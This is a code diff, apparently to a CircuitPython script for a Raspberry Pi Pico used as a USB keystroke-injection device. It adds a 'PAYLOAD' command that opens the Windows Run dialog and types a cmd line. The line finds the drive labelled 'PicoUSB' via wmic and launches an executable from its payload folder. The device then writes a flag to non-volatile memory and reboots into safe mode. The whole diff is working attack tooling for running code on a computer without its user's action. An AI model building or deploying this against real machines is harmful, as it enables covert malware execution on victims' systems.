@@ -3,6 +3,7 @@ import os
 import re
 import time
 import board
+import microcontroller
 import storage
 import usb_hid
 import digitalio
@@ -25,6 +26,7 @@ led = digitalio.DigitalInOut(board.GP12)
 led.direction = digitalio.Direction.OUTPUT
 led.value = True
 
+flag = microcontroller.nvm[0]
 looping = False
 loop_pos = 0
 
@@ -41,6 +43,17 @@ def execute_command(function, command):
             for idx in range(0, len(command), 1):
                 keys[idx] = getattr(Keycode, command[idx])
             kb.send(*keys)
+    elif function == "PAYLOAD":
+        kb.send(Keycode.WINDOWS,Keycode.R)
+        time.sleep(0.1)
+        layout.write(
+            r'cmd /c "timeout /t 5 >nul & for /f \"tokens=2 delims==\" %i in (\'wmic logicaldisk where \"VolumeName=\'PicoUSB\'\" get DeviceID /value\') do start \"\" \"%i\\payload\\' + command
+        )
+        kb.send(Keycode.ENTER)
+        time.sleep(0.1)
+        microcontroller.nvm[0] = 1
+        microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)
+        microcontroller.reset()
     elif function == "WRITE":
         layout.write(command)
     elif function == "HOLD":
